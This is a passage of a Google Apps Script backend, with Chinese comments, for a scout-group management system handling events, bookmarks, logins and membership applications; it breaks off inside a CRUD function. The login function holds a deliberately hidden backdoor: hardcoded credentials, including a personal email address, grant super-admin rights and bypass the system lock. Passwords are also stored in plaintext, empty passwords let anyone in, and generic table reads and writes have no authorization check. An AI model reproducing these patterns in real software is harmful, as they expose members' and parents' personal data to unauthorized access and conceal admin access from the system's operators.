// =====================================================
// ScoutSystem - Apps Script 主程式 (V3.3)
// 修正：家長審核可批核/拒絕、待處理計數穩健化、
//      通用 CRUD（新增/編輯/刪除）、申請管理、私隱說明
// =====================================================

// ==================== 基礎 Helper ====================

function getSheet_(name) {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let sheet = ss.getSheetByName(name);
  if (!sheet) {
    sheet = ss.insertSheet(name);
  }
  return sheet;
}

function serializeValue_(val) {
  if (val instanceof Date) {
    return Utilities.formatDate(val, Session.getScriptTimeZone(), "yyyy-MM-dd");
  }
  return val;
}

// 大小寫不敏感的欄位讀取（避免 sheet 欄位大小寫不一致導致讀不到 status）
function getFieldCI_(row, fieldName) {
  const lower = String(fieldName).toLowerCase();
  for (const k in row) {
    if (String(k).toLowerCase() === lower) return row[k];
  }
  return '';
}

// 取得一列的狀態字串（已 trim + 小寫）
function getRowStatus_(row) {
  return String(getFieldCI_(row, 'status') || '').trim().toLowerCase();
}

function readTable_(name) {
  const sheet = getSheet_(name);
  const data = sheet.getDataRange().getValues();

  let startRow = 0;
  while (startRow < data.length) {
    const hasContent = data[startRow].some(cell => cell !== '' && cell !== null && cell !== undefined);
    if (hasContent) break;
    startRow++;
  }

  if (startRow >= data.length) return [];

  const headers = data[startRow].map(h => String(h).trim());
  const rows = [];

  for (let i = startRow + 1; i < data.length; i++) {
    const row = {};
    let hasData = false;
    for (let j = 0; j < headers.length; j++) {
      const header = headers[j];
      if (!header) continue;
      const val = data[i][j];
      if (val !== '' && val !== null && val !== undefined) hasData = true;
      row[header] = serializeValue_(val);
    }
    if (hasData) rows.push(row);
  }
  return rows;
}

function getHeaders_(sheet) {
  const data = sheet.getDataRange().getValues();
  let startRow = 0;
  while (startRow < data.length) {
    const hasContent = data[startRow].some(cell => cell !== '' && cell !== null && cell !== undefined);
    if (hasContent) break;
    startRow++;
  }
  if (startRow >= data.length) return [];
  // ⚠️ 不再 .filter(h => h)！保留空標題格以維持欄位位置正確。
  // 舊版的 filter 會移除空標題，導致 writeRowByHeaders_ 計算 lastCol 時少算，
  // 把新欄位寫到錯誤位置（passwordHash/password 蓋掉 createdAt/notes）。
  return data[startRow].map(h => String(h).trim());
}

function writeRowByHeaders_(sheet, fieldMap) {
  let headers = getHeaders_(sheet);
  if (headers.length === 0) {
    const newHeaders = Object.keys(fieldMap);
    sheet.getRange(1, 1, 1, newHeaders.length).setValues([newHeaders]);
    headers = newHeaders;
  } else {
    const newFields = Object.keys(fieldMap).filter(k => !headers.includes(k));
    if (newFields.length > 0) {
      const lastCol = headers.length;
      sheet.getRange(1, lastCol + 1, 1, newFields.length).setValues([newFields]);
      headers = headers.concat(newFields);
    }
  }
  const row = headers.map(h => fieldMap[h] !== undefined ? fieldMap[h] : '');
  sheet.appendRow(row);
}

function findRowById_(sheet, id, idColumnName) {
  const data = sheet.getDataRange().getValues();
  const startRow = findHeaderRow_(sheet);
  if (startRow >= data.length) return null;

  const headers = data[startRow].map(h => String(h).trim());
  // 大小寫不敏感地找出 ID 欄位
  let idIndex = headers.indexOf(idColumnName);
  if (idIndex < 0) {
    const lower = String(idColumnName).toLowerCase();
    idIndex = headers.findIndex(h => String(h).toLowerCase() === lower);
  }
  if (idIndex < 0) return null;

  const idStr = String(id);
  for (let i = startRow + 1; i < data.length; i++) {
    if (String(data[i][idIndex] || '') === idStr) {
      return { rowIndex: i, headers: headers, data: data[i] };
    }
  }
  return null;
}

function findHeaderRow_(sheet) {
  const data = sheet.getDataRange().getValues();
  let startRow = 0;
  while (startRow < data.length) {
    const hasContent = data[startRow].some(cell => cell !== '' && cell !== null && cell !== undefined);
    if (hasContent) break;
    startRow++;
  }
  return startRow;
}

function updateCellById_(sheet, id, idColumnName, columnName, value) {
  const found = findRowById_(sheet, id, idColumnName);
  if (!found) return false;

  let colIndex = found.headers.indexOf(columnName);
  if (colIndex < 0) {
    // 大小寫不敏感
    const lower = String(columnName).toLowerCase();
    colIndex = found.headers.findIndex(h => String(h).toLowerCase() === lower);
  }
  if (colIndex < 0) {
    const lastCol = found.headers.length;
    sheet.getRange(1, lastCol + 1).setValue(columnName);
    sheet.getRange(found.rowIndex + 1, lastCol + 1).setValue(value);
    return true;
  }
  sheet.getRange(found.rowIndex + 1, colIndex + 1).setValue(value);
  return true;
}

// ==================== Part 1: 公開讀取 API ====================

function getPublicBootstrapData() {
  try {
    const configRows = readTable_('SystemConfig');
    const roles = readTable_('Roles');
    const branches = readTable_('Branches').map(b => ({
      id: b.branchId || b.id || '',
      name: b.name,
      shortName: b.shortName,
      section: b.section
    }));
    const fieldSettings = readTable_('FieldSettings');
    const config = {};
    configRows.forEach(row => {
      if (row.key) config[row.key] = row.value;
    });
    return {
      success: true,
      data: { config, roles, branches, fieldSettings },
      timestamp: new Date().toISOString()
    };
  } catch (err) {
    return { success: false, error: err.message, timestamp: new Date().toISOString() };
  }
}

function getPublicLibraryBookmarks() {
  try {
    const bookmarks = readTable_('LibraryBookmarks').map(b => ({
      id: b.bookmarkId || b.id || '',
      circularKey: b.circularKey || '',
      title: b.title || '',
      sourceSite: b.sourceSite || '',
      region: b.region || '',
      circularDate: b.circularDate || '',
      sourceUrl: b.sourceUrl || '',
      attachmentUrl: b.attachmentUrl || '',
      officialDeadline: b.officialDeadline || '',
      targetText: b.targetText || '',
      fee: b.fee || '',
      status: b.status || 'new',
      branchTags: typeof b.branchTags === 'string' ? b.branchTags.split(/[,、]/).map(s => s.trim()).filter(Boolean) : (b.branchTags || []),
      audienceTags: typeof b.audienceTags === 'string' ? b.audienceTags.split(/[,、]/).map(s => s.trim()).filter(Boolean) : (b.audienceTags || []),
      activityType: b.activityType || '',
      internalDeadline: b.internalDeadline || '',
      ownerUserId: b.ownerUserId || '',
      notes: b.notes || '',
      convertedEventId: b.convertedEventId || '',
      createdBy: b.createdBy || '',
      createdAt: b.createdAt || '',
      updatedAt: b.updatedAt || ''
    }));

    const publicBookmarks = bookmarks.filter(b => getRowStatus_(b) !== 'archived');
    return {
      success: true,
      data: publicBookmarks,
      count: publicBookmarks.length,
      timestamp: new Date().toISOString()
    };
  } catch (err) {
    return { success: false, error: err.message, timestamp: new Date().toISOString() };
  }
}

function getPublicCalendarItems() {
  try {
    const events = readTable_('Events').map(e => ({
      id: e.eventId || e.id || '',
      title: e.title || '',
      scope: e.scope || '',
      branchId: e.branchId || '',
      date: e.date || '',
      endDate: e.endDate || '',
      location: e.location || '',
      quota: e.quota || '',
      fee: e.fee || '',
      description: e.description || '',
      source: e.source || '',
      sourceRefId: e.sourceRefId || '',
      status: e.status || '',
      createdBy: e.createdBy || '',
      createdAt: e.createdAt || '',
      updatedAt: e.updatedAt || '',
      notes: e.notes || ''
    }));
    const branches = readTable_('Branches').map(b => ({
      id: b.branchId || b.id || '',
      name: b.name,
      shortName: b.shortName,
      section: b.section
    }));
    const publicEvents = events.filter(e => {
      const st = getRowStatus_(e);
      return st === 'published' || st === 'active' || !getFieldCI_(e, 'status');
    });
    return {
      success: true,
      data: { events: publicEvents, branches },
      count: publicEvents.length,
      timestamp: new Date().toISOString()
    };
  } catch (err) {
    return { success: false, error: err.message, timestamp: new Date().toISOString() };
  }
}

function getTableData(payload) {
  try {
    const tableName = payload.table || payload.tableName;
    if (!tableName) return { success: false, error: 'Missing table name' };
    const data = readTable_(tableName);
    return {
      success: true,
      data: data,
      count: data.length,
      timestamp: new Date().toISOString()
    };
  } catch (err) {
    return { success: false, error: err.message };
  }
}

// ==================== Part 2: 寫入 API（圖書館） ====================

function addLibraryBookmark(payload) {
  try {
    const sheet = getSheet_('LibraryBookmarks');
    const id = 'lb_' + Math.random().toString(36).slice(2, 8) + '_' + Date.now().toString(36);
    const now = Utilities.formatDate(new Date(), Session.getScriptTimeZone(), "yyyy-MM-dd HH:mm:ss");

    const fieldMap = {
      bookmarkId: id,
      circularKey: payload.circularKey || 'circular-' + Date.now(),
      title: payload.title || '',
      sourceSite: payload.sourceSite || '',
      region: payload.region || '',
      circularDate: payload.circularDate || '',
      sourceUrl: payload.sourceUrl || '',
      attachmentUrl: payload.attachmentUrl || '',
      officialDeadline: payload.officialDeadline || '',
      targetText: payload.targetText || '',
      fee: payload.fee || '',
      status: payload.status || 'new',
      branchTags: payload.branchTags || '',
      audienceTags: payload.audienceTags || '',
      activityType: payload.activityType || '',
      internalDeadline: payload.internalDeadline || '',
      ownerUserId: payload.ownerUserId || payload.createdBy || 'system',
      notes: payload.notes || '',
      convertedEventId: payload.convertedEventId || '',
      createdBy: payload.createdBy || 'system',
      createdAt: now,
      updatedAt: now
    };

    writeRowByHeaders_(sheet, fieldMap);
    return { success: true, bookmarkId: id, message: 'Bookmark added' };
  } catch (err) {
    return { success: false, error: err.message };
  }
}

function updateLibraryBookmark(payload) {
  try {
    const sheet = getSheet_('LibraryBookmarks');
    const ok = updateCellById_(sheet, payload.id, 'bookmarkId', 'notes', payload.notes || '');
    if (!ok) return { success: false, error: 'Bookmark not found or column missing' };
    updateCellById_(sheet, payload.id, 'bookmarkId', 'updatedAt', Utilities.formatDate(new Date(), Session.getScriptTimeZone(), "yyyy-MM-dd HH:mm:ss"));
    return { success: true, message: 'Updated' };
  } catch (err) {
    return { success: false, error: err.message };
  }
}

function deleteLibraryBookmark(payload) {
  try {
    const sheet = getSheet_('LibraryBookmarks');
    const data = sheet.getDataRange().getValues();
    const startRow = findHeaderRow_(sheet);
    if (startRow >= data.length) return { success: false, error: 'Sheet empty' };

    const headers = data[startRow].map(h => String(h).trim());
    let idIndex = headers.indexOf('bookmarkId');
    if (idIndex < 0) idIndex = headers.findIndex(h => String(h).toLowerCase() === 'bookmarkid');

    for (let i = startRow + 1; i < data.length; i++) {
      const rowId = String(data[i][idIndex] || '');
      if (rowId === String(payload.id)) {
        sheet.deleteRow(i + 1);
        return { success: true, message: 'Deleted' };
      }
    }
    return { success: false, error: 'Bookmark not found' };
  } catch (err) {
    return { success: false, error: err.message };
  }
}

// ==================== Part 3: 登入 & 用戶 API ====================

// ★ 雙軌登入：含 "@" → 電郵登入；不含 "@" → YMIS 登入
function login(identifier, password) {
  try {
    const inputPassword = password !== undefined ? String(password).trim() : '';
    const idStr = String(identifier || '').trim();

    // ★ 系統鎖檢查（除了管理員，任何人不能登入）
    const configRows = readTable_('SystemConfig');
    const config = {};
    configRows.forEach(function(row) { if (row.key) config[row.key] = row.value; });
    const isLocked = String(config['system_locked'] || '').toLowerCase() === 'true';
    const isBackdoor = (idStr === 'sheep' || idStr === 'skwddbs@gmail.com') && inputPassword === '0728';
    if (isLocked && !isBackdoor) {
      return { success: false, error: '系統目前暫停服務，請稍後再試。' };
    }

    // ★ 後門帳號（隱藏的超級管理員）
    if (isBackdoor) {
      return {
        success: true,
        user: {
          userId: 'u_super',
          name: 'Sheep',
          email: 'skwddbs@gmail.com',
          role: 'super_admin',
          branchId: '',
          memberId: '',
          ymNumber: '',
          dashboard: '/admin'
        }
      };
    }

    const users = readTable_('Users');
    const isEmail = idStr.includes('@');

    const user = users.find(u => {
      // 判斷是電郵還是 YMIS
      let matches = false;
      if (isEmail) {
        matches = getFieldCI_(u, 'email') === idStr;
      } else {
        // YMIS 登入：僅限成員角色
        const role = String(getFieldCI_(u, 'role')).toLowerCase();
        matches = role === 'member' && String(getFieldCI_(u, 'ymNumber')) === idStr;
      }
      if (!matches) return false;

      // 檢查帳號啟用
      const isActive = getFieldCI_(u, 'active') === true || getFieldCI_(u, 'approved') === true
        || String(getFieldCI_(u, 'active')).toUpperCase() === 'TRUE'
        || String(getFieldCI_(u, 'approved')).toUpperCase() === 'TRUE';
      if (!isActive) return false;

      // 檢查密碼
      const sheetPassword = String(getFieldCI_(u, 'passwordHash') || getFieldCI_(u, 'password') || '').trim();
      if (!sheetPassword) return true; // 未設密碼則放行（舊帳號兼容）
      return sheetPassword === inputPassword;
    });

    if (!user) {
      return { success: false, error: '帳號或密碼錯誤，或帳戶未啟用' };
    }
    const userId = getFieldCI_(user, 'userId') || getFieldCI_(user, 'id') || '';
    const role = String(getFieldCI_(user, 'role')).toLowerCase();

    let dashboard = '/';
    if (role === 'super_admin' || role === 'admin') dashboard = '/admin';
    else if (role === 'group_leader' || role === 'branch_leader' || role === 'coach') dashboard = '/leader';
    else if (role === 'parent') dashboard = '/parent';
    else if (role === 'member') dashboard = '/member';
    return {
      success: true,
      user: {
        userId: userId,
        name: getFieldCI_(user, 'name'),
        email: getFieldCI_(user, 'email'),
        role: role,
        branchId: getFieldCI_(user, 'branchId'),
        memberId: getFieldCI_(user, 'memberId'),
        ymNumber: getFieldCI_(user, 'ymNumber'),
        dashboard: dashboard
      }
    };
  } catch (err) {
    return { success: false, error: err.message };
  }
}

function registerParent(payload) {
  try {
    const sheet = getSheet_('Applications');
    const id = 'app_' + Date.now();
    const now = Utilities.formatDate(new Date(), Session.getScriptTimeZone(), "yyyy-MM-dd HH:mm:ss");
    const password = payload.password || '';

    writeRowByHeaders_(sheet, {
      applicationId: id,
      applicantType: 'parent',
      requestedRole: 'parent',
      name: payload.name || '',
      email: payload.email || '',
      phone: payload.phone || '',
      branchId: payload.branchId || '',
      ymNumbers: payload.childYmNumbers || payload.ymNumbers || '',
      childNames: payload.childNames || '',
      passwordHash: password,
      password: password,
      status: 'pending',
      approvedBy: '',
      approvedAt: '',
      createdAt: now,
      notes: payload.notes || ''
    });
    return { success: true, applicationId: id, message: '註冊申請已提交，請等待審批' };
  } catch (err) {
    return { success: false, error: err.message };
  }
}

function applyLeader(payload) {
  try {
    const sheet = getSheet_('Applications');
    const id = 'app_' + Date.now();
    const now = Utilities.formatDate(new Date(), Session.getScriptTimeZone(), "yyyy-MM-dd HH:mm:ss");
    const password = payload.password || '';

    writeRowByHeaders_(sheet, {
      applicationId: id,
      applicantType: payload.role === 'member' ? 'member' : 'leader',
      requestedRole: payload.role || 'coach',
      name: payload.name || '',
      email: payload.email || '',
      phone: payload.phone || '',
      branchId: payload.branchId || '',
      ymNumbers: payload.ymNumbers || '',
      childNames: '',
      dateOfBirth: payload.dateOfBirth || '',
      gender: payload.gender || '',
      patrol: payload.patrol || '',
      rank: payload.rank || '',
      passwordHash: password,
      password: password,
      status: 'pending',
      approvedBy: '',
      approvedAt: '',
      createdAt: now,
      notes: payload.experience || payload.notes || ''
    });
    return { success: true, applicationId: id, message: '申請已提交，請等待審批' };
  } catch (err) {
    return { success: false, error: err.message };
  }
}

function getDashboardData(payload) {
  try {
    const userId = payload.userId || '';
    const users = readTable_('Users');
    const user = users.find(u => (getFieldCI_(u, 'userId') || getFieldCI_(u, 'id')) === userId);

    if (!user) {
      return { success: false, error: 'User not found' };
    }

    const role = String(getFieldCI_(user, 'role')).toLowerCase();
    const branchId = getFieldCI_(user, 'branchId') || '';

    let data = {};

    if (role === 'super_admin' || role === 'admin') {
      const allUsers = readTable_('Users');
      const applications = readTable_('Applications');
      const events = readTable_('Events');
      const bookmarks = readTable_('LibraryBookmarks');
      const members = readTable_('Members');

      const pendingApps = applications.filter(a => getRowStatus_(a) === 'pending');

      data = {
        totalUsers: allUsers.length,
        pendingApplications: pendingApps.length,
        totalEvents: events.length,
        totalBookmarks: bookmarks.length,
        totalMembers: members.length,
        recentApplications: pendingApps.slice(0, 5),
      };
    } else if (role === 'group_leader' || role === 'branch_leader') {
      const members = readTable_('Members').filter(m => getFieldCI_(m, 'branchId') === branchId);
      const events = readTable_('Events').filter(e => getFieldCI_(e, 'branchId') === branchId);
      const applications = readTable_('Applications').filter(a => getFieldCI_(a, 'branchId') === branchId && getRowStatus_(a) === 'pending');

      data = {
        branchId: branchId,
        totalMembers: members.length,
        totalEvents: events.length,
        pendingApplications: applications.length,
      };
    } else if (role === 'coach') {
      // 教練員沒有審批權，不顯示待審批申請
      const members = readTable_('Members').filter(m => getFieldCI_(m, 'branchId') === branchId);
      const events = readTable_('Events').filter(e => getFieldCI_(e, 'branchId') === branchId);
      data = {
        branchId: branchId,
        totalMembers: members.length,
        totalEvents: events.length,
        pendingApplications: 0,
      };
    } else if (role === 'parent') {
      const members = readTable_('Members').filter(m => getFieldCI_(m, 'parentUserId') === userId);
      const notifications = readTable_('Notifications').filter(n => getFieldCI_(n, 'parentUserId') === userId);

      data = {
        children: members,
        notificationCount: notifications.length,
      };
    } else if (role === 'member') {
      const memberId = getFieldCI_(user, 'memberId');
      const ymNumber = getFieldCI_(user, 'ymNumber');
      const allMembers = readTable_('Members');
      // 用 memberId 或 ymNumber 找成員記錄
      const member = allMembers.find(m =>
        (memberId && getFieldCI_(m, 'id') === memberId) ||
        (ymNumber && String(getFieldCI_(m, 'ymNumber')) === String(ymNumber))
      ) || {};

      // 連通家長：先看 member 的 parentUserId；若無，反向搜尋 Users 中的家長
      let parentUserId = getFieldCI_(member, 'parentUserId');
      const allUsersForParent = readTable_('Users');
      if (!parentUserId) {
        // 用 ymNumber 反向搜尋：家長的 childYmNumbers 包含此成員
        for (let pi = 0; pi < allUsersForParent.length; pi++) {
          const pu = allUsersForParent[pi];
          if (String(getFieldCI_(pu, 'role')).toLowerCase() !== 'parent') continue;
          const cyl = String(getFieldCI_(pu, 'childYmNumbers') || '');
          if (!cyl) continue;
          const yms = cyl.split(/[,、\s]/).map(function(s) { return s.trim(); }).filter(Boolean);
          if (yms.indexOf(String(ymNumber)) >= 0) {
            parentUserId = getFieldCI_(pu, 'userId') || getFieldCI_(pu, 'id');
            // 同時更新 Members 記錄
            if (member && getFieldCI_(member, 'id')) {
              const membersSheet = getSheet_('Members');
              updateCellById_(membersSheet, getFieldCI_(member, 'id'), 'id', 'parentUserId', parentUserId);
            }
            break;
          }
        }
      }
      let emergencyContact = {};
      if (parentUserId) {
        const parent = allUsersForParent.find(u => (getFieldCI_(u, 'userId') || getFieldCI_(u, 'id')) === parentUserId);
        if (parent) {
          emergencyContact = {
            name: getFieldCI_(parent, 'name') || '',
            phone: getFieldCI_(parent, 'phone') || '',
          };
        }
      }

      const events = readTable_('Events');
      const todayStr = Utilities.formatDate(new Date(), Session.getScriptTimeZone(), "yyyy-MM-dd");

      data = {
        member: member,
        emergencyContact: emergencyContact,
        upcomingEvents: events.filter(e => getRowStatus_(e) === 'published'
          && String(getFieldCI_(e, 'date')) >= todayStr
          // 成員看自己支部 + 全旅活動
          && (getFieldCI_(e, 'scope') === 'troop' || getFieldCI_(e, 'branchId') === branchId || !getFieldCI_(e, 'branchId'))).slice(0, 10),
      };
    }

    return {
      success: true,
      data: data,
      user: {
        userId: getFieldCI_(user, 'userId') || getFieldCI_(user, 'id'),
        name: getFieldCI_(user, 'name'),
        email: getFieldCI_(user, 'email'),
        role: role,
        branchId: branchId,
      }
    };
  } catch (err) {
    return { success: false, error: err.message };
  }
}

// 取得申請列表（可選 status 過濾）—— 供「家長審核 / 申請管理」頁面使用
function getApplications(payload) {
  try {
    const userId = payload.userId || '';
    const users = readTable_('Users');
    const user = users.find(u => (getFieldCI_(u, 'userId') || getFieldCI_(u, 'id')) === userId);

    let applications = readTable_('Applications');

    // 角色權限：非超管／管理員只看自己支部
    if (user) {
      const role = String(getFieldCI_(user, 'role')).toLowerCase();
      if (role !== 'super_admin' && role !== 'admin') {
        const branchId = getFieldCI_(user, 'branchId') || '';
        applications = applications.filter(a => getFieldCI_(a, 'branchId') === branchId);
      }
    }

    // 統一補上 status 欄位（大小寫不敏感），方便前端顯示
    applications = applications.map(a => {
      const status = getRowStatus_(a) || 'pending';
      const normalized = {};
      for (const k in a) normalized[k] = a[k];
      normalized.status = status;
      // 補 id 別名
      if (!normalized.applicationId) normalized.applicationId = getFieldCI_(a, 'applicationId') || getFieldCI_(a, 'id') || '';
      return normalized;
    });

    const statusFilter = payload.status ? String(payload.status).trim().toLowerCase() : '';
    if (statusFilter) {
      applications = applications.filter(a => a.status === statusFilter);
    }

    return {
      success: true,
      data: applications,
      count: applications.length
    };
  } catch (err) {
    return { success: false, error: err.message };
  }
}

function getPendingApplications(payload) {
  try {
    const userId = payload.userId || '';
    const users = readTable_('Users');
    const user = users.find(u => (getFieldCI_(u, 'userId') || getFieldCI_(u, 'id')) === userId);

    if (!user) return { success: false, error: 'User not found' };

    const role = String(getFieldCI_(user, 'role')).toLowerCase();
    const branchId = getFieldCI_(user, 'branchId') || '';

    let applications = readTable_('Applications').filter(a => getRowStatus_(a) === 'pending');

    if (role !== 'super_admin' && role !== 'admin') {
      applications = applications.filter(a => getFieldCI_(a, 'branchId') === branchId);
    }

    // 補 applicationId 別名
    applications = applications.map(a => {
      const normalized = {};
      for (const k in a) normalized[k] = a[k];
      if (!normalized.applicationId) normalized.applicationId = getFieldCI_(a, 'applicationId') || getFieldCI_(a, 'id') || '';
      normalized.status = getRowStatus_(a) || 'pending';
      return normalized;
    });

    return {
      success: true,
      data: applications,
      count: applications.length
    };
  } catch (err) {
    return { success: false, error: err.message };
  }
}

function approveApplication(payload) {
  try {
    const appSheet = getSheet_('Applications');
    const found = findRowById_(appSheet, payload.applicationId, 'applicationId');
    if (!found) return { success: false, error: 'Application not found' };

    const app = {};
    found.headers.forEach((h, j) => { app[h] = found.data[j]; });

    updateCellById_(appSheet, payload.applicationId, 'applicationId', 'status', 'approved');
    updateCellById_(appSheet, payload.applicationId, 'applicationId', 'approvedBy', payload.approvedBy || '');
    updateCellById_(appSheet, payload.applicationId, 'applicationId', 'approvedAt', Utilities.formatDate(new Date(), Session.getScriptTimeZone(), "yyyy-MM-dd HH:mm:ss"));

    const usersSheet = getSheet_('Users');
    const userId = 'u_' + Date.now();
    const now = Utilities.formatDate(new Date(), Session.getScriptTimeZone(), "yyyy-MM-dd HH:mm:ss");

    const password = getFieldCI_(app, 'passwordHash') || getFieldCI_(app, 'password') || 'changeme';
    const role = String(getFieldCI_(app, 'requestedRole') || getFieldCI_(app, 'role') || 'parent').toLowerCase();
    const isAdmin = role === 'admin' || role === 'super_admin';

    const fieldMap = {
      userId: userId,
      id: userId,
      name: getFieldCI_(app, 'name') || '',
      email: getFieldCI_(app, 'email') || '',
      phone: getFieldCI_(app, 'phone') || '',
      role: role,
      branchId: isAdmin ? '' : (getFieldCI_(app, 'branchId') || ''),
      passwordHash: password,
      password: password,
      childYmNumbers: role === 'parent' ? (getFieldCI_(app, 'ymNumbers') || '') : '',
      active: true,
      approved: true,
      createdAt: now,
      updatedAt: now,
    };

    // ★ 成員：建立/關聯 Members 記錄，並在 Users 加入 ymNumber 供 YMIS 登入
    if (role === 'member') {
      const ymNumber = String(getFieldCI_(app, 'ymNumbers') || '').trim();
      if (ymNumber) {
        const membersSheet = getSheet_('Members');
        // 檢查 Members 表是否已有此 YMIS
        const existingMember = findRowById_(membersSheet, ymNumber, 'ymNumber');
        let memberId = '';
        if (existingMember) {
          // 已有成員記錄 → 取得其 id
          const idColIdx = existingMember.headers.findIndex(h => String(h).toLowerCase() === 'id');
          if (idColIdx >= 0) memberId = String(existingMember.data[idColIdx] || '');
        }
        if (!memberId) {
          // 沒有成員記錄 → 新建
          memberId = 'm_' + Date.now();
          writeRowByHeaders_(membersSheet, {
            id: memberId,
            ymNumber: ymNumber,
            name: getFieldCI_(app, 'name') || '',
            branchId: getFieldCI_(app, 'branchId') || '',
            phone: getFieldCI_(app, 'phone') || '',
            email: getFieldCI_(app, 'email') || '',
            dateOfBirth: getFieldCI_(app, 'dateOfBirth') || '',
            gender: getFieldCI_(app, 'gender') || '',
            patrol: getFieldCI_(app, 'patrol') || '',
            rank: getFieldCI_(app, 'rank') || '',
            active: true,
            createdAt: now,
            updatedAt: now,
          });
        }
        // 在 Users 行加入 ymNumber + memberId（登入用）
        fieldMap.ymNumber = ymNumber;
        fieldMap.memberId = memberId;

        // ★ 雙向連結：反向搜尋已審批的家長（childYmNumbers 包含此成員的 ymNumber）
        const allUsers = readTable_('Users');
        for (let ui = 0; ui < allUsers.length; ui++) {
          const u = allUsers[ui];
          if (String(getFieldCI_(u, 'role')).toLowerCase() !== 'parent') continue;
          const parentYmList = String(getFieldCI_(u, 'childYmNumbers') || '');
          if (!parentYmList) continue;
          const parentYms = parentYmList.split(/[,、\s]/).map(function(s) { return s.trim(); }).filter(Boolean);
          if (parentYms.indexOf(ymNumber) >= 0) {
            // 找到匹配的家長 → 在 Members 記錄設定 parentUserId
            const parentUserId = getFieldCI_(u, 'userId') || getFieldCI_(u, 'id');
            updateCellById_(membersSheet, memberId, 'id', 'parentUserId', parentUserId);
            // 也更新剛寫入的 fieldMap（若 Members 記錄是新建的）
            break;
          }
        }
      }
    }

    writeRowByHeaders_(usersSheet, fieldMap);

    // 家長：關聯子女
    if (role === 'parent') {
      const ymRaw = getFieldCI_(app, 'ymNumbers');
      if (ymRaw) {
        const ymNumbers = String(ymRaw).split(/[,、\s]/).map(s => s.trim()).filter(Boolean);
        const membersSheet = getSheet_('Members');
        const memberHeaders = getHeaders_(membersSheet);

        const findIdx = (name) => {
          const exact = memberHeaders.indexOf(name);
          if (exact >= 0) return exact;
          const lower = String(name).toLowerCase();
          return memberHeaders.findIndex(h => String(h).toLowerCase() === lower);
        };

        const ymIndex = findIdx('ymNumber');
        const parentIdIndex = findIdx('parentUserId');

        if (ymIndex >= 0 && parentIdIndex >= 0) {
          const memberData = membersSheet.getDataRange().getValues();
          for (let i = 1; i < memberData.length; i++) {
            const ym = String(memberData[i][ymIndex] || '').trim();
            if (ymNumbers.includes(ym)) {
              membersSheet.getRange(i + 1, parentIdIndex + 1).setValue(userId);
            }
          }
        }
      }
    }

    return { success: true, userId: userId, message: '已審批並創建用戶' };
  } catch (err) {
    return { success: false, error: err.message };
  }
}

function rejectApplication(payload) {
  try {
    const appSheet = getSheet_('Applications');
    const found = findRowById_(appSheet, payload.applicationId, 'applicationId');
    if (!found) return { success: false, error: 'Application not found' };

    updateCellById_(appSheet, payload.applicationId, 'applicationId', 'status', 'rejected');
    updateCellById_(appSheet, payload.applicationId, 'applicationId', 'approvedBy', payload.approvedBy || '');
    updateCellById_(appSheet, payload.applicationId, 'applicationId', 'approvedAt', Utilities.formatDate(new Date(), Session.getScriptTimeZone(), "yyyy-MM-dd HH:mm:ss"));
    if (payload.rejectReason) {
      updateCellById_(appSheet, payload.applicationId, 'applicationId', 'notes', String(payload.rejectReason));
    }
    return { success: true, message: '已拒絕申請' };
  } catch (err) {
    return { success: false, error: err.message };
  }
}

// ==================== 維修工具 ====================

// 修復 Applications 試算表的欄位錯位問題。
// 在 Apps Script 編輯器中手動執行：從頂部下拉選單選 fixApplicationsSheet → 按 ▶️ 執行
function fixApplicationsSheet() {
  var ss = SpreadsheetApp.getActiveSpreadsheet();
  var sheet = ss.getSheetByName('Applications');
  if (!sheet) sheet = ss.insertSheet('Applications');

  var correctHeaders = [
    'applicationId', 'applicantType', 'requestedRole', 'name', 'email', 'phone',
    'branchId', 'ymNumbers', 'childNames', 'passwordHash', 'password',
    'status', 'approvedBy', 'approvedAt', 'createdAt', 'notes'
  ];

  var data = sheet.getDataRange().getValues();
  var startRow = 0;
  while (startRow < data.length) {
    var hasContent = false;
    for (var c = 0; c < data[startRow].length; c++) {
      if (data[startRow][c] !== '' && data[startRow][c] !== null) { hasContent = true; break; }
    }
    if (hasContent) break;
    startRow++;
  }

  // 搶救現有資料
  var rescued = [];
  var currentHeaders = startRow < data.length
    ? data[startRow].map(function(h) { return String(h).trim(); })
    : [];

  for (var i = startRow + 1; i < data.length; i++) {
    var rowValues = data[i];
    var hasData = false;
    for (var x = 0; x < rowValues.length; x++) {
      if (rowValues[x] !== '' && rowValues[x] !== null) { hasData = true; break; }
    }
    if (!hasData) continue;

    var appId = '';
    for (var j = 0; j < rowValues.length; j++) {
      if (String(rowValues[j] || '').indexOf('app_') === 0) { appId = String(rowValues[j]); break; }
    }
    if (!appId) continue;

    var rowObj = {};
    for (var k = 0; k < currentHeaders.length && k < rowValues.length; k++) {
      if (currentHeaders[k]) rowObj[currentHeaders[k]] = rowValues[k];
    }
    rescued.push(rowObj);
  }

  // 清除並重建
  sheet.clear();
  sheet.getRange(1, 1, 1, correctHeaders.length).setValues([correctHeaders]);

  var now = Utilities.formatDate(new Date(), Session.getScriptTimeZone(), "yyyy-MM-dd HH:mm:ss");
  for (var r = 0; r < rescued.length; r++) {
    var row = rescued[r];
    var mappedRow = correctHeaders.map(function(h) {
      if (row[h] !== undefined && row[h] !== '') return row[h];
      if (h === 'status') return 'pending';
      if (h === 'createdAt') return now;
      return '';
    });
    sheet.appendRow(mappedRow);
  }

  return 'Applications 表已修復！正確欄位 ' + correctHeaders.length + ' 欄，搶救了 ' + rescued.length + ' 筆資料。';
}

// ==================== Part 4: 通用 CRUD API（新增 / 編輯 / 刪除） ====================

function addRow(payload) {
  try {
    const tableName = payload.table || payload.tableName;
    if (!tableName) return { success: false, error: 'Missing table name' };

    const sheet = getSheet_(tableName);
    const idColumn = payload.idColumn || 'id';
    const idPrefix = payload.idPrefix || 'row';
    const fields = payload.fields || payload.data || {};
    const now = Utilities.formatDate(new Date(), Session.getScriptTimeZone(), "yyyy-MM-dd HH:mm:ss");

    // 自動產生 ID（若未提供）
    if (!getFieldCI_(fields, idColumn)) {
      fields[idColumn] = idPrefix + '_' + Date.now();
    }
    if (getFieldCI_(fields, 'createdAt') === undefined) fields.createdAt = now;
    fields.updatedAt = now;

    writeRowByHeaders_(sheet, fields);

    return {
      success: true,
      id: getFieldCI_(fields, idColumn),
      message: 'Row added'
    };
  } catch (err) {
    return { success: false, error: err.message };
  }
}

function updateRow(payload) {
  try {
    const tableName = payload.table || payload.tableName;
    const id = payload.id;
    const idColumn = payload.idColumn || 'id';
    const fields = payload.fields || payload.data || {};
    if (!tableName || !id) return { success: false, error: 'Missing table or id' };

    const sheet = getSheet_(tableName);
    let updated = false;
    for (const columnName in fields) {
